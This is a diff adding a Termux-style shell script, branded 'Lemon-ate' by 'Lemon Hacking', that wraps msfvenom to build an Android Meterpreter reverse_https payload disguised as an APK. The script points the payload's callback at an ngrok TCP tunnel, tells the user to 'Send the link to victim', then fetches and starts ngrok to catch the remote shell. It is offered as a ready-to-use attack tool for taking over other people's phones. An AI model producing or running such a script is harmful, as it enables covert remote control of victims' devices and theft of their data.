@@ -1,0 +1,67 @@
+clear
+rm $HOME/Lemon/*
+clear
+echo ‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡ | lolcat
+figlet L e m o n - a t e| lolcat -a -d 5
+figlet by whitedot | lolcat -a -d 4
+echo ‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡ | lolcat
+echo By Lemon Hacking | lolcat
+echo [+] PLEASE ENTER A PORT, '(more than 1024)' | lolcat
+read -p '>>> ' port
+if [ $port -le 1024 ]
+then
+printf "\033[1;31m[-] Port must be more than 1024\033[0m\n"
+echo ‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡ | lolcat
+else
+echo ‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡ | lolcat
+echo [+] Do you want to continue? | lolcat
+read -p '>>> ' ans
+if [ $ans = yes ]
+then
+echo "[+] Enter Payload's name (Put .apk after your name)" | lolcat
+read -p '>>> ' name
+echo ‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡ | lolcat
+echo "[+] Put your payload's name after the link you get from sh ssh" | lolcat
+echo [+] For Example : lente.serveo.net/yourpayload.apk | lolcat
+echo [+] Send the link to victim | lolcat
+echo [+] This may take a few minutes | lolcat
+echo ‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡ | lolcat
+msfvenom -p android/meterpreter/reverse_https LHOST=0.tcp.ngrok.io LPORT=$port R> $HOME/Lemon/$name & PID=$!
+echo "Generating Payload.." | lolcat
+printf "["
+while kill -0 $PID 2> /dev/null; do
+    printf  "▓"
+    sleep 2
+done
+clear && printf "Generated!!" | lolcat
+echo
+echo "[+] Choose forwarding service" | lolcat
+echo " 1. Serveo [ NOT AVAILABLE ]" | lolcat
+echo " 2. Ngrok " | lolcat
+read -p '>>> ' ser
+if [ $ser = 2 ] ; then
+echo "Do you have Ngrok installed?" | lolcat
+read -p '>>> ' ngr
+if [ $ngr = no ] ; then
+curl --output $HOME/ngrok.zip -0 https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
+cd
+unzip ngrok.zip
+mv ngrok $PREFIX/bin/
+chmod +x $PREFIX/bin/ngrok
+ngrok tcp $port
+else
+cd
+ngrok tcp $port
+fi
+else
+echo "[+] Serveo is not available" | lolcat
+fi
+else
+printf "\033[1;31m[-] Exiting..\033[0m\n"
+fi
+fi
+
+
+
+
+
